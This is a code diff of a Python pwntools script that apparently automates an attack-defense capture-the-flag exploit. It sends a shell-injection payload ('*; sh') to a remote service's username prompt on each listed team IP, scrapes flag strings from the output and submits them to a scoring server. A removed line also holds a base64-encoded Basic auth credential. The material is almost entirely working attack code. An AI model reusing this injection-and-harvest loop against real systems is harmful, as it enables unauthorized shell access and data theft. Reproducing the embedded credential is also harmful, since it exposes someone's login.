@@ -48,7 +48,7 @@ def submit_flag(flag):
 	data = json.dumps({"flag": flag})
 	# if the team name is bi0s and password is bi0s - you need base64 of "bi0s:bi0s"
 	# header = {"Authorization": "Basic YmkwczpiaTBz"}
-	header = {"Authorization": 'Basic SW52YWRlcnM6S2lsbGVyMTIzQA=='}
+	header = {"Authorization": 'Basic <username:password>'}
 	r = requests.post(url, data=data, headers=header)
 	print r.text 
 	if(r.text["result"]=="correct"):
@@ -57,49 +57,12 @@ def submit_flag(flag):
 	return
 
 
-def exp(ip):
-    payload = "*"
-    
-    r = remote(ip, PORT)
-    r.recvuntil("Enter username: ")
-    print(payload)
-    r.sendline(payload)
-    print(r.recv())
-    r.sendline("1")
-    print(r.recv())
-    fuck = r.recv()
-    fuck = r.recv()
-    s = fuck.split(":")
 
-    for i in range(len(s)):
-    	if s[i][:3] == "FLG":
-    		t = s[i][:15]
-    		print(t)
-    		submit_flag(t)
-    # print("\n".join(re.findall("[0-9A-Z]{26}=", fuck)))1
-    # r.interactive()
-    # r.recvuntil("Your choice: ")
-    # r.sendline("1") 
-    # data = r.recv()
-    # print(data)
-    # print(data)
-    r.close()
-for i in IPS[1:]:
+for i in IPS:
 	try:
 
 		ip = i["ip"]
-		payload = "asjdhfc8971234; sh"
-
-		# r = remote(ip, PORT)
-		# r.recvuntil("Enter username: ")
-		# print(payload)
-		# r.sendline(payload)
-		# print(r.recv())
-		# r.sendline("1")
-		# print(r.recv())
-		# fuck = r.recv() 
-		# print(fuck)
-		# r.close()
+		payload = "*; sh"
 		r = remote(ip, PORT)
 		r.recvuntil("Enter username: ")
 		print(payload)
@@ -111,21 +74,11 @@ for i in IPS[1:]:
 		s = r.recv()
 		s += r.recv()
 		s = s.split(":")
-		print(s)
 		for i in range(len(s)):
 			if s[i][:3] == "FLG":
 				t = s[i][:16]
 				print(t)
 				submit_flag(t)
-		# r.interactive()
-		print(s)
-		# print("\n".join(re.findall("[0-9A-Z]{26}=", fuck)))1
-		# r.interactive()
-		# r.recvuntil("Your choice: ")
-		# r.sendline("1") 
-		# data = r.recv()
-		# print(data)
-		# print(data)
 		r.close()
 	except:
 		r.close()
